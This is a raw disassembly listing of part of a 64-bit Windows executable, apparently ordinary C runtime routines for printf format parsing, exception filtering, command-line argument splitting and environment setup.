   140004f5d:	eb 0b                	jmp    0x140004f6a
   140004f5f:	41 f6 c4 01          	test   $0x1,%r12b
   140004f63:	74 10                	je     0x140004f75
   140004f65:	c6 44 24 4c 2b       	movb   $0x2b,0x4c(%rsp)
   140004f6a:	bf 01 00 00 00       	mov    $0x1,%edi
   140004f6f:	89 7c 24 48          	mov    %edi,0x48(%rsp)
   140004f73:	eb 11                	jmp    0x140004f86
   140004f75:	41 f6 c4 02          	test   $0x2,%r12b
   140004f79:	74 07                	je     0x140004f82
   140004f7b:	c6 44 24 4c 20       	movb   $0x20,0x4c(%rsp)
   140004f80:	eb e8                	jmp    0x140004f6a
   140004f82:	8b 7c 24 48          	mov    0x48(%rsp),%edi
   140004f86:	8b 74 24 54          	mov    0x54(%rsp),%esi
   140004f8a:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   140004f8f:	2b 74 24 44          	sub    0x44(%rsp),%esi
   140004f93:	2b f7                	sub    %edi,%esi
   140004f95:	41 f6 c4 0c          	test   $0xc,%r12b
   140004f99:	75 11                	jne    0x140004fac
   140004f9b:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   140004fa0:	4c 8b c5             	mov    %rbp,%r8
   140004fa3:	8b d6                	mov    %esi,%edx
   140004fa5:	b1 20                	mov    $0x20,%cl
   140004fa7:	e8 c8 f7 ff ff       	call   0x140004774
   140004fac:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   140004fb1:	48 8d 4c 24 4c       	lea    0x4c(%rsp),%rcx
   140004fb6:	4c 8b c5             	mov    %rbp,%r8
   140004fb9:	8b d7                	mov    %edi,%edx
   140004fbb:	e8 08 f8 ff ff       	call   0x1400047c8
   140004fc0:	41 f6 c4 08          	test   $0x8,%r12b
   140004fc4:	74 17                	je     0x140004fdd
   140004fc6:	41 f6 c4 04          	test   $0x4,%r12b
   140004fca:	75 11                	jne    0x140004fdd
   140004fcc:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   140004fd1:	4c 8b c5             	mov    %rbp,%r8
   140004fd4:	8b d6                	mov    %esi,%edx
   140004fd6:	b1 30                	mov    $0x30,%cl
   140004fd8:	e8 97 f7 ff ff       	call   0x140004774
   140004fdd:	8b 7c 24 44          	mov    0x44(%rsp),%edi
   140004fe1:	33 c0                	xor    %eax,%eax
   140004fe3:	39 44 24 50          	cmp    %eax,0x50(%rsp)
   140004fe7:	74 75                	je     0x14000505e
   140004fe9:	3b f8                	cmp    %eax,%edi
   140004feb:	7e 71                	jle    0x14000505e
   140004fed:	48 8b eb             	mov    %rbx,%rbp
   140004ff0:	44 0f b7 4d 00       	movzwl 0x0(%rbp),%r9d
   140004ff5:	48 8d 94 24 c0 02 00 	lea    0x2c0(%rsp),%rdx
   140004ffc:	00 
   140004ffd:	48 8d 8c 24 a0 00 00 	lea    0xa0(%rsp),%rcx
   140005004:	00 
   140005005:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   14000500b:	ff cf                	dec    %edi
   14000500d:	48 83 c5 02          	add    $0x2,%rbp
   140005011:	e8 ee 30 00 00       	call   0x140008104
   140005016:	45 33 d2             	xor    %r10d,%r10d
   140005019:	41 3b c2             	cmp    %r10d,%eax
   14000501c:	75 32                	jne    0x140005050
   14000501e:	8b 94 24 a0 00 00 00 	mov    0xa0(%rsp),%edx
   140005025:	41 3b d2             	cmp    %r10d,%edx
   140005028:	74 26                	je     0x140005050
   14000502a:	4c 8b 44 24 68       	mov    0x68(%rsp),%r8
   14000502f:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   140005034:	48 8d 8c 24 c0 02 00 	lea    0x2c0(%rsp),%rcx
   14000503b:	00 
   14000503c:	e8 87 f7 ff ff       	call   0x1400047c8
   140005041:	45 33 d2             	xor    %r10d,%r10d
   140005044:	41 3b fa             	cmp    %r10d,%edi
   140005047:	75 a7                	jne    0x140004ff0
   140005049:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   14000504e:	eb 23                	jmp    0x140005073
   140005050:	48 8b 6c 24 68       	mov    0x68(%rsp),%rbp
   140005055:	41 8b c6             	mov    %r14d,%eax
   140005058:	89 44 24 40          	mov    %eax,0x40(%rsp)
   14000505c:	eb 19                	jmp    0x140005077
   14000505e:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   140005063:	4c 8b c5             	mov    %rbp,%r8
   140005066:	8b d7                	mov    %edi,%edx
   140005068:	48 8b cb             	mov    %rbx,%rcx
   14000506b:	e8 58 f7 ff ff       	call   0x1400047c8
   140005070:	45 33 d2             	xor    %r10d,%r10d
   140005073:	8b 44 24 40          	mov    0x40(%rsp),%eax
   140005077:	41 3b c2             	cmp    %r10d,%eax
   14000507a:	7c 1a                	jl     0x140005096
   14000507c:	41 f6 c4 04          	test   $0x4,%r12b
   140005080:	74 14                	je     0x140005096
   140005082:	4c 8d 4c 24 40       	lea    0x40(%rsp),%r9
   140005087:	4c 8b c5             	mov    %rbp,%r8
   14000508a:	8b d6                	mov    %esi,%edx
   14000508c:	b1 20                	mov    $0x20,%cl
   14000508e:	e8 e1 f6 ff ff       	call   0x140004774
   140005093:	45 33 d2             	xor    %r10d,%r10d
   140005096:	48 8b 84 24 98 00 00 	mov    0x98(%rsp),%rax
   14000509d:	00 
   14000509e:	49 3b c2             	cmp    %r10,%rax
   1400050a1:	74 13                	je     0x1400050b6
   1400050a3:	48 8b c8             	mov    %rax,%rcx
   1400050a6:	e8 6d d9 ff ff       	call   0x140002a18
   1400050ab:	45 33 d2             	xor    %r10d,%r10d
   1400050ae:	4c 89 94 24 98 00 00 	mov    %r10,0x98(%rsp)
   1400050b5:	00 
   1400050b6:	48 8b bc 24 b0 00 00 	mov    0xb0(%rsp),%rdi
   1400050bd:	00 
   1400050be:	8b 74 24 40          	mov    0x40(%rsp),%esi
   1400050c2:	8b 54 24 5c          	mov    0x5c(%rsp),%edx
   1400050c6:	4c 8d 0d 33 af ff ff 	lea    -0x50cd(%rip),%r9        # 0x140000000
   1400050cd:	41 bb 00 02 00 00    	mov    $0x200,%r11d
   1400050d3:	40 8a 2f             	mov    (%rdi),%bpl
   1400050d6:	41 3a ea             	cmp    %r10b,%bpl
   1400050d9:	0f 85 18 f9 ff ff    	jne    0x1400049f7
   1400050df:	41 3b d2             	cmp    %r10d,%edx
   1400050e2:	74 09                	je     0x1400050ed
   1400050e4:	83 fa 07             	cmp    $0x7,%edx
   1400050e7:	0f 85 8f f8 ff ff    	jne    0x14000497c
   1400050ed:	44 38 94 24 90 00 00 	cmp    %r10b,0x90(%rsp)
   1400050f4:	00 
   1400050f5:	74 0f                	je     0x140005106
   1400050f7:	48 8b 8c 24 88 00 00 	mov    0x88(%rsp),%rcx
   1400050fe:	00 
   1400050ff:	83 a1 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rcx)
   140005106:	8b c6                	mov    %esi,%eax
   140005108:	48 8b 8c 24 c8 02 00 	mov    0x2c8(%rsp),%rcx
   14000510f:	00 
   140005110:	48 33 cc             	xor    %rsp,%rcx
   140005113:	e8 28 c9 ff ff       	call   0x140001a40
   140005118:	48 8b 9c 24 20 03 00 	mov    0x320(%rsp),%rbx
   14000511f:	00 
   140005120:	48 81 c4 d0 02 00 00 	add    $0x2d0,%rsp
   140005127:	41 5f                	pop    %r15
   140005129:	41 5e                	pop    %r14
   14000512b:	41 5d                	pop    %r13
   14000512d:	41 5c                	pop    %r12
   14000512f:	5f                   	pop    %rdi
   140005130:	5e                   	pop    %rsi
   140005131:	5d                   	pop    %rbp
   140005132:	c3                   	ret
   140005133:	40 80 fd 49          	cmp    $0x49,%bpl
   140005137:	74 3d                	je     0x140005176
   140005139:	40 80 fd 68          	cmp    $0x68,%bpl
   14000513d:	74 2e                	je     0x14000516d
   14000513f:	40 80 fd 6c          	cmp    $0x6c,%bpl
   140005143:	74 0d                	je     0x140005152
   140005145:	40 80 fd 77          	cmp    $0x77,%bpl
   140005149:	75 88                	jne    0x1400050d3
   14000514b:	41 0f ba ec 0b       	bts    $0xb,%r12d
   140005150:	eb 81                	jmp    0x1400050d3
   140005152:	80 3f 6c             	cmpb   $0x6c,(%rdi)
   140005155:	75 0d                	jne    0x140005164
   140005157:	48 ff c7             	inc    %rdi
   14000515a:	41 0f ba ec 0c       	bts    $0xc,%r12d
   14000515f:	e9 6f ff ff ff       	jmp    0x1400050d3
   140005164:	41 83 cc 10          	or     $0x10,%r12d
   140005168:	e9 66 ff ff ff       	jmp    0x1400050d3
   14000516d:	41 83 cc 20          	or     $0x20,%r12d
   140005171:	e9 5d ff ff ff       	jmp    0x1400050d3
   140005176:	8a 07                	mov    (%rdi),%al
   140005178:	41 0f ba ec 0f       	bts    $0xf,%r12d
   14000517d:	3c 36                	cmp    $0x36,%al
   14000517f:	75 14                	jne    0x140005195
   140005181:	80 7f 01 34          	cmpb   $0x34,0x1(%rdi)
   140005185:	75 0e                	jne    0x140005195
   140005187:	48 83 c7 02          	add    $0x2,%rdi
   14000518b:	41 0f ba ec 0f       	bts    $0xf,%r12d
   140005190:	e9 3e ff ff ff       	jmp    0x1400050d3
   140005195:	3c 33                	cmp    $0x33,%al
   140005197:	75 14                	jne    0x1400051ad
   140005199:	80 7f 01 32          	cmpb   $0x32,0x1(%rdi)
   14000519d:	75 0e                	jne    0x1400051ad
   14000519f:	48 83 c7 02          	add    $0x2,%rdi
   1400051a3:	41 0f ba f4 0f       	btr    $0xf,%r12d
   1400051a8:	e9 26 ff ff ff       	jmp    0x1400050d3
   1400051ad:	3c 64                	cmp    $0x64,%al
   1400051af:	0f 84 1e ff ff ff    	je     0x1400050d3
   1400051b5:	3c 69                	cmp    $0x69,%al
   1400051b7:	0f 84 16 ff ff ff    	je     0x1400050d3
   1400051bd:	3c 6f                	cmp    $0x6f,%al
   1400051bf:	0f 84 0e ff ff ff    	je     0x1400050d3
   1400051c5:	3c 75                	cmp    $0x75,%al
   1400051c7:	0f 84 06 ff ff ff    	je     0x1400050d3
   1400051cd:	3c 78                	cmp    $0x78,%al
   1400051cf:	0f 84 fe fe ff ff    	je     0x1400050d3
   1400051d5:	3c 58                	cmp    $0x58,%al
   1400051d7:	0f 84 f6 fe ff ff    	je     0x1400050d3
   1400051dd:	44 89 54 24 5c       	mov    %r10d,0x5c(%rsp)
   1400051e2:	48 8d 54 24 78       	lea    0x78(%rsp),%rdx
   1400051e7:	40 0f b6 cd          	movzbl %bpl,%ecx
   1400051eb:	44 89 54 24 50       	mov    %r10d,0x50(%rsp)
   1400051f0:	e8 57 2c 00 00       	call   0x140007e4c
   1400051f5:	33 f6                	xor    %esi,%esi
   1400051f7:	3b c6                	cmp    %esi,%eax
   1400051f9:	74 21                	je     0x14000521c
   1400051fb:	48 8b 54 24 68       	mov    0x68(%rsp),%rdx
   140005200:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140005205:	40 8a cd             	mov    %bpl,%cl
   140005208:	e8 1f f5 ff ff       	call   0x14000472c
   14000520d:	40 8a 2f             	mov    (%rdi),%bpl
   140005210:	48 ff c7             	inc    %rdi
   140005213:	40 3a ee             	cmp    %sil,%bpl
   140005216:	0f 84 02 01 00 00    	je     0x14000531e
   14000521c:	48 8b 54 24 68       	mov    0x68(%rsp),%rdx
   140005221:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   140005226:	40 8a cd             	mov    %bpl,%cl
   140005229:	e8 fe f4 ff ff       	call   0x14000472c
   14000522e:	45 33 d2             	xor    %r10d,%r10d
   140005231:	e9 88 fe ff ff       	jmp    0x1400050be
   140005236:	40 80 fd 2a          	cmp    $0x2a,%bpl
   14000523a:	75 19                	jne    0x140005255
   14000523c:	45 8b 7d 00          	mov    0x0(%r13),%r15d
   140005240:	49 83 c5 08          	add    $0x8,%r13
   140005244:	45 3b fa             	cmp    %r10d,%r15d
   140005247:	0f 8d 86 fe ff ff    	jge    0x1400050d3
   14000524d:	45 8b fe             	mov    %r14d,%r15d
   140005250:	e9 7e fe ff ff       	jmp    0x1400050d3
   140005255:	43 8d 0c bf          	lea    (%r15,%r15,4),%ecx
   140005259:	40 0f be c5          	movsbl %bpl,%eax
   14000525d:	44 8d 7c 48 d0       	lea    -0x30(%rax,%rcx,2),%r15d
   140005262:	e9 6c fe ff ff       	jmp    0x1400050d3
   140005267:	45 8b fa             	mov    %r10d,%r15d
   14000526a:	e9 64 fe ff ff       	jmp    0x1400050d3
   14000526f:	40 80 fd 2a          	cmp    $0x2a,%bpl
   140005273:	75 1d                	jne    0x140005292
   140005275:	41 8b 45 00          	mov    0x0(%r13),%eax
   140005279:	49 83 c5 08          	add    $0x8,%r13
   14000527d:	41 3b c2             	cmp    %r10d,%eax
   140005280:	89 44 24 54          	mov    %eax,0x54(%rsp)
   140005284:	0f 8d 49 fe ff ff    	jge    0x1400050d3
   14000528a:	41 83 cc 04          	or     $0x4,%r12d
   14000528e:	f7 d8                	neg    %eax
   140005290:	eb 0f                	jmp    0x1400052a1
   140005292:	8b 44 24 54          	mov    0x54(%rsp),%eax
   140005296:	8d 0c 80             	lea    (%rax,%rax,4),%ecx
   140005299:	40 0f be c5          	movsbl %bpl,%eax
   14000529d:	8d 44 48 d0          	lea    -0x30(%rax,%rcx,2),%eax
   1400052a1:	89 44 24 54          	mov    %eax,0x54(%rsp)
   1400052a5:	e9 29 fe ff ff       	jmp    0x1400050d3
   1400052aa:	40 80 fd 20          	cmp    $0x20,%bpl
   1400052ae:	74 41                	je     0x1400052f1
   1400052b0:	40 80 fd 23          	cmp    $0x23,%bpl
   1400052b4:	74 31                	je     0x1400052e7
   1400052b6:	40 80 fd 2b          	cmp    $0x2b,%bpl
   1400052ba:	74 22                	je     0x1400052de
   1400052bc:	40 80 fd 2d          	cmp    $0x2d,%bpl
   1400052c0:	74 13                	je     0x1400052d5
   1400052c2:	40 80 fd 30          	cmp    $0x30,%bpl
   1400052c6:	0f 85 07 fe ff ff    	jne    0x1400050d3
   1400052cc:	41 83 cc 08          	or     $0x8,%r12d
   1400052d0:	e9 fe fd ff ff       	jmp    0x1400050d3
   1400052d5:	41 83 cc 04          	or     $0x4,%r12d
   1400052d9:	e9 f5 fd ff ff       	jmp    0x1400050d3
   1400052de:	41 83 cc 01          	or     $0x1,%r12d
   1400052e2:	e9 ec fd ff ff       	jmp    0x1400050d3
   1400052e7:	41 0f ba ec 07       	bts    $0x7,%r12d
   1400052ec:	e9 e2 fd ff ff       	jmp    0x1400050d3
   1400052f1:	41 83 cc 02          	or     $0x2,%r12d
   1400052f5:	e9 d9 fd ff ff       	jmp    0x1400050d3
   1400052fa:	44 89 54 24 70       	mov    %r10d,0x70(%rsp)
   1400052ff:	44 89 54 24 58       	mov    %r10d,0x58(%rsp)
   140005304:	44 89 54 24 54       	mov    %r10d,0x54(%rsp)
   140005309:	44 89 54 24 48       	mov    %r10d,0x48(%rsp)
   14000530e:	45 8b e2             	mov    %r10d,%r12d
   140005311:	45 8b fe             	mov    %r14d,%r15d
   140005314:	44 89 54 24 50       	mov    %r10d,0x50(%rsp)
   140005319:	e9 b5 fd ff ff       	jmp    0x1400050d3
   14000531e:	e8 81 dd ff ff       	call   0x1400030a4
   140005323:	45 33 c9             	xor    %r9d,%r9d
   140005326:	45 33 c0             	xor    %r8d,%r8d
   140005329:	33 d2                	xor    %edx,%edx
   14000532b:	33 c9                	xor    %ecx,%ecx
   14000532d:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140005332:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140005338:	e8 97 dc ff ff       	call   0x140002fd4
   14000533d:	40 38 b4 24 90 00 00 	cmp    %sil,0x90(%rsp)
   140005344:	00 
   140005345:	e9 5a f6 ff ff       	jmp    0x1400049a4
   14000534a:	cc                   	int3
   14000534b:	cc                   	int3
   14000534c:	48 83 ec 28          	sub    $0x28,%rsp
   140005350:	48 8b 01             	mov    (%rcx),%rax
   140005353:	81 38 63 73 6d e0    	cmpl   $0xe06d7363,(%rax)
   140005359:	75 2b                	jne    0x140005386
   14000535b:	83 78 18 04          	cmpl   $0x4,0x18(%rax)
   14000535f:	75 25                	jne    0x140005386
   140005361:	8b 40 20             	mov    0x20(%rax),%eax
   140005364:	3d 20 05 93 19       	cmp    $0x19930520,%eax
   140005369:	74 15                	je     0x140005380
   14000536b:	3d 21 05 93 19       	cmp    $0x19930521,%eax
   140005370:	74 0e                	je     0x140005380
   140005372:	3d 22 05 93 19       	cmp    $0x19930522,%eax
   140005377:	74 07                	je     0x140005380
   140005379:	3d 00 40 99 01       	cmp    $0x1994000,%eax
   14000537e:	75 06                	jne    0x140005386
   140005380:	e8 43 ec ff ff       	call   0x140003fc8
   140005385:	cc                   	int3
   140005386:	33 c0                	xor    %eax,%eax
   140005388:	48 83 c4 28          	add    $0x28,%rsp
   14000538c:	c3                   	ret
   14000538d:	cc                   	int3
   14000538e:	cc                   	int3
   14000538f:	cc                   	int3
   140005390:	48 83 ec 28          	sub    $0x28,%rsp
   140005394:	48 8d 0d b1 ff ff ff 	lea    -0x4f(%rip),%rcx        # 0x14000534c
   14000539b:	ff 15 7f 8d 00 00    	call   *0x8d7f(%rip)        # 0x14000e120
   1400053a1:	33 c0                	xor    %eax,%eax
   1400053a3:	48 83 c4 28          	add    $0x28,%rsp
   1400053a7:	c3                   	ret
   1400053a8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400053ad:	57                   	push   %rdi
   1400053ae:	48 83 ec 20          	sub    $0x20,%rsp
   1400053b2:	33 ff                	xor    %edi,%edi
   1400053b4:	39 3d e6 13 01 00    	cmp    %edi,0x113e6(%rip)        # 0x1400167a0
   1400053ba:	75 05                	jne    0x1400053c1
   1400053bc:	e8 03 18 00 00       	call   0x140006bc4
   1400053c1:	48 8b 1d b8 13 01 00 	mov    0x113b8(%rip),%rbx        # 0x140016780
   1400053c8:	48 8d 05 02 ae 00 00 	lea    0xae02(%rip),%rax        # 0x1400101d1
   1400053cf:	48 85 db             	test   %rbx,%rbx
   1400053d2:	48 0f 44 d8          	cmove  %rax,%rbx
   1400053d6:	80 3b 20             	cmpb   $0x20,(%rbx)
   1400053d9:	77 09                	ja     0x1400053e4
   1400053db:	80 3b 00             	cmpb   $0x0,(%rbx)
   1400053de:	74 33                	je     0x140005413
   1400053e0:	85 ff                	test   %edi,%edi
   1400053e2:	74 29                	je     0x14000540d
   1400053e4:	80 3b 22             	cmpb   $0x22,(%rbx)
   1400053e7:	75 09                	jne    0x1400053f2
   1400053e9:	33 c0                	xor    %eax,%eax
   1400053eb:	85 ff                	test   %edi,%edi
   1400053ed:	0f 94 c0             	sete   %al
   1400053f0:	8b f8                	mov    %eax,%edi
   1400053f2:	0f b6 0b             	movzbl (%rbx),%ecx
   1400053f5:	e8 4e 30 00 00       	call   0x140008448
   1400053fa:	85 c0                	test   %eax,%eax
   1400053fc:	74 03                	je     0x140005401
   1400053fe:	48 ff c3             	inc    %rbx
   140005401:	48 ff c3             	inc    %rbx
   140005404:	eb d0                	jmp    0x1400053d6
   140005406:	3c 20                	cmp    $0x20,%al
   140005408:	77 09                	ja     0x140005413
   14000540a:	48 ff c3             	inc    %rbx
   14000540d:	8a 03                	mov    (%rbx),%al
   14000540f:	84 c0                	test   %al,%al
   140005411:	75 f3                	jne    0x140005406
   140005413:	48 8b c3             	mov    %rbx,%rax
   140005416:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000541b:	48 83 c4 20          	add    $0x20,%rsp
   14000541f:	5f                   	pop    %rdi
   140005420:	c3                   	ret
   140005421:	cc                   	int3
   140005422:	cc                   	int3
   140005423:	cc                   	int3
   140005424:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005429:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000542e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140005433:	57                   	push   %rdi
   140005434:	48 83 ec 30          	sub    $0x30,%rsp
   140005438:	83 3d 61 13 01 00 00 	cmpl   $0x0,0x11361(%rip)        # 0x1400167a0
   14000543f:	75 05                	jne    0x140005446
   140005441:	e8 7e 17 00 00       	call   0x140006bc4
   140005446:	48 8b 1d cb f1 00 00 	mov    0xf1cb(%rip),%rbx        # 0x140014618
   14000544d:	33 ff                	xor    %edi,%edi
   14000544f:	48 85 db             	test   %rbx,%rbx
   140005452:	75 1b                	jne    0x14000546f
   140005454:	83 c8 ff             	or     $0xffffffff,%eax
   140005457:	e9 c9 00 00 00       	jmp    0x140005525
   14000545c:	3c 3d                	cmp    $0x3d,%al
   14000545e:	74 02                	je     0x140005462
   140005460:	ff c7                	inc    %edi
   140005462:	48 8b cb             	mov    %rbx,%rcx
   140005465:	e8 06 d5 ff ff       	call   0x140002970
   14000546a:	48 8d 5c 03 01       	lea    0x1(%rbx,%rax,1),%rbx
   14000546f:	8a 03                	mov    (%rbx),%al
   140005471:	84 c0                	test   %al,%al
   140005473:	75 e7                	jne    0x14000545c
   140005475:	8d 47 01             	lea    0x1(%rdi),%eax
   140005478:	ba 08 00 00 00       	mov    $0x8,%edx
   14000547d:	48 63 c8             	movslq %eax,%rcx
   140005480:	e8 2b 0a 00 00       	call   0x140005eb0
   140005485:	48 8b f8             	mov    %rax,%rdi
   140005488:	48 89 05 49 f1 00 00 	mov    %rax,0xf149(%rip)        # 0x1400145d8
   14000548f:	48 85 c0             	test   %rax,%rax
   140005492:	74 c0                	je     0x140005454
   140005494:	48 8b 1d 7d f1 00 00 	mov    0xf17d(%rip),%rbx        # 0x140014618
   14000549b:	80 3b 00             	cmpb   $0x0,(%rbx)
   14000549e:	74 65                	je     0x140005505
   1400054a0:	48 8b cb             	mov    %rbx,%rcx
   1400054a3:	e8 c8 d4 ff ff       	call   0x140002970
   1400054a8:	80 3b 3d             	cmpb   $0x3d,(%rbx)
   1400054ab:	8d 70 01             	lea    0x1(%rax),%esi
   1400054ae:	74 43                	je     0x1400054f3
   1400054b0:	48 63 ee             	movslq %esi,%rbp
   1400054b3:	ba 01 00 00 00       	mov    $0x1,%edx
   1400054b8:	48 8b cd             	mov    %rbp,%rcx
   1400054bb:	e8 f0 09 00 00       	call   0x140005eb0
   1400054c0:	48 89 07             	mov    %rax,(%rdi)
   1400054c3:	48 85 c0             	test   %rax,%rax
   1400054c6:	74 72                	je     0x14000553a
   1400054c8:	4c 8b c3             	mov    %rbx,%r8
   1400054cb:	48 8b d5             	mov    %rbp,%rdx
   1400054ce:	48 8b c8             	mov    %rax,%rcx
   1400054d1:	e8 56 d3 ff ff       	call   0x14000282c
   1400054d6:	85 c0                	test   %eax,%eax
   1400054d8:	74 15                	je     0x1400054ef
   1400054da:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   1400054e0:	45 33 c9             	xor    %r9d,%r9d
   1400054e3:	45 33 c0             	xor    %r8d,%r8d
   1400054e6:	33 d2                	xor    %edx,%edx
   1400054e8:	33 c9                	xor    %ecx,%ecx
   1400054ea:	e8 bd d9 ff ff       	call   0x140002eac
   1400054ef:	48 83 c7 08          	add    $0x8,%rdi
   1400054f3:	48 63 c6             	movslq %esi,%rax
   1400054f6:	48 03 d8             	add    %rax,%rbx
   1400054f9:	80 3b 00             	cmpb   $0x0,(%rbx)
   1400054fc:	75 a2                	jne    0x1400054a0
   1400054fe:	48 8b 1d 13 f1 00 00 	mov    0xf113(%rip),%rbx        # 0x140014618
   140005505:	48 8b cb             	mov    %rbx,%rcx
   140005508:	e8 0b d5 ff ff       	call   0x140002a18
   14000550d:	48 83 25 03 f1 00 00 	andq   $0x0,0xf103(%rip)        # 0x140014618
   140005514:	00 
   140005515:	48 83 27 00          	andq   $0x0,(%rdi)
   140005519:	c7 05 65 12 01 00 01 	movl   $0x1,0x11265(%rip)        # 0x140016788
   140005520:	00 00 00 
   140005523:	33 c0                	xor    %eax,%eax
   140005525:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000552a:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   14000552f:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140005534:	48 83 c4 30          	add    $0x30,%rsp
   140005538:	5f                   	pop    %rdi
   140005539:	c3                   	ret
   14000553a:	48 8b 0d 97 f0 00 00 	mov    0xf097(%rip),%rcx        # 0x1400145d8
   140005541:	e8 d2 d4 ff ff       	call   0x140002a18
   140005546:	48 83 25 8a f0 00 00 	andq   $0x0,0xf08a(%rip)        # 0x1400145d8
   14000554d:	00 
   14000554e:	e9 01 ff ff ff       	jmp    0x140005454
   140005553:	cc                   	int3
   140005554:	48 8b c4             	mov    %rsp,%rax
   140005557:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000555b:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000555f:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140005563:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140005567:	41 54                	push   %r12
   140005569:	41 55                	push   %r13
   14000556b:	41 56                	push   %r14
   14000556d:	48 83 ec 20          	sub    $0x20,%rsp
   140005571:	4c 8b 6c 24 60       	mov    0x60(%rsp),%r13
   140005576:	4d 8b f1             	mov    %r9,%r14
   140005579:	49 8b f8             	mov    %r8,%rdi
   14000557c:	41 83 65 00 00       	andl   $0x0,0x0(%r13)
   140005581:	4c 8b e2             	mov    %rdx,%r12
   140005584:	48 8b d9             	mov    %rcx,%rbx
   140005587:	41 c7 01 01 00 00 00 	movl   $0x1,(%r9)
   14000558e:	48 85 d2             	test   %rdx,%rdx
   140005591:	74 07                	je     0x14000559a
   140005593:	4c 89 02             	mov    %r8,(%rdx)
   140005596:	49 83 c4 08          	add    $0x8,%r12
   14000559a:	33 ed                	xor    %ebp,%ebp
   14000559c:	80 3b 22             	cmpb   $0x22,(%rbx)
   14000559f:	75 11                	jne    0x1400055b2
   1400055a1:	33 c0                	xor    %eax,%eax
   1400055a3:	85 ed                	test   %ebp,%ebp
   1400055a5:	40 b6 22             	mov    $0x22,%sil
   1400055a8:	0f 94 c0             	sete   %al
   1400055ab:	48 ff c3             	inc    %rbx
   1400055ae:	8b e8                	mov    %eax,%ebp
   1400055b0:	eb 39                	jmp    0x1400055eb
   1400055b2:	41 ff 45 00          	incl   0x0(%r13)
   1400055b6:	48 85 ff             	test   %rdi,%rdi
   1400055b9:	74 07                	je     0x1400055c2
   1400055bb:	8a 03                	mov    (%rbx),%al
   1400055bd:	88 07                	mov    %al,(%rdi)
   1400055bf:	48 ff c7             	inc    %rdi
   1400055c2:	0f b6 33             	movzbl (%rbx),%esi
   1400055c5:	48 ff c3             	inc    %rbx
   1400055c8:	8b ce                	mov    %esi,%ecx
   1400055ca:	e8 79 2e 00 00       	call   0x140008448
   1400055cf:	85 c0                	test   %eax,%eax
   1400055d1:	74 13                	je     0x1400055e6
   1400055d3:	41 ff 45 00          	incl   0x0(%r13)
   1400055d7:	48 85 ff             	test   %rdi,%rdi
   1400055da:	74 07                	je     0x1400055e3
   1400055dc:	8a 03                	mov    (%rbx),%al
   1400055de:	88 07                	mov    %al,(%rdi)
   1400055e0:	48 ff c7             	inc    %rdi
   1400055e3:	48 ff c3             	inc    %rbx
   1400055e6:	40 84 f6             	test   %sil,%sil
   1400055e9:	74 1b                	je     0x140005606
   1400055eb:	85 ed                	test   %ebp,%ebp
   1400055ed:	75 ad                	jne    0x14000559c
   1400055ef:	40 80 fe 20          	cmp    $0x20,%sil
   1400055f3:	74 06                	je     0x1400055fb
   1400055f5:	40 80 fe 09          	cmp    $0x9,%sil
   1400055f9:	75 a1                	jne    0x14000559c
   1400055fb:	48 85 ff             	test   %rdi,%rdi
   1400055fe:	74 09                	je     0x140005609
   140005600:	c6 47 ff 00          	movb   $0x0,-0x1(%rdi)
   140005604:	eb 03                	jmp    0x140005609
   140005606:	48 ff cb             	dec    %rbx
   140005609:	33 f6                	xor    %esi,%esi
   14000560b:	80 3b 00             	cmpb   $0x0,(%rbx)
   14000560e:	0f 84 e3 00 00 00    	je     0x1400056f7
   140005614:	80 3b 20             	cmpb   $0x20,(%rbx)
   140005617:	74 05                	je     0x14000561e
   140005619:	80 3b 09             	cmpb   $0x9,(%rbx)
   14000561c:	75 05                	jne    0x140005623
   14000561e:	48 ff c3             	inc    %rbx
   140005621:	eb f1                	jmp    0x140005614
   140005623:	80 3b 00             	cmpb   $0x0,(%rbx)
   140005626:	0f 84 cb 00 00 00    	je     0x1400056f7
   14000562c:	4d 85 e4             	test   %r12,%r12
   14000562f:	74 08                	je     0x140005639
   140005631:	49 89 3c 24          	mov    %rdi,(%r12)
   140005635:	49 83 c4 08          	add    $0x8,%r12
   140005639:	41 ff 06             	incl   (%r14)
   14000563c:	ba 01 00 00 00       	mov    $0x1,%edx
   140005641:	33 c9                	xor    %ecx,%ecx
   140005643:	eb 05                	jmp    0x14000564a
   140005645:	48 ff c3             	inc    %rbx
   140005648:	ff c1                	inc    %ecx
   14000564a:	80 3b 5c             	cmpb   $0x5c,(%rbx)
   14000564d:	74 f6                	je     0x140005645
   14000564f:	80 3b 22             	cmpb   $0x22,(%rbx)
   140005652:	75 36                	jne    0x14000568a
   140005654:	84 ca                	test   %cl,%dl
   140005656:	75 1d                	jne    0x140005675
   140005658:	85 f6                	test   %esi,%esi
   14000565a:	74 0e                	je     0x14000566a
   14000565c:	48 8d 43 01          	lea    0x1(%rbx),%rax
   140005660:	80 38 22             	cmpb   $0x22,(%rax)
   140005663:	75 05                	jne    0x14000566a
   140005665:	48 8b d8             	mov    %rax,%rbx
   140005668:	eb 0b                	jmp    0x140005675
   14000566a:	33 c0                	xor    %eax,%eax
   14000566c:	33 d2                	xor    %edx,%edx
   14000566e:	85 f6                	test   %esi,%esi
   140005670:	0f 94 c0             	sete   %al
   140005673:	8b f0                	mov    %eax,%esi
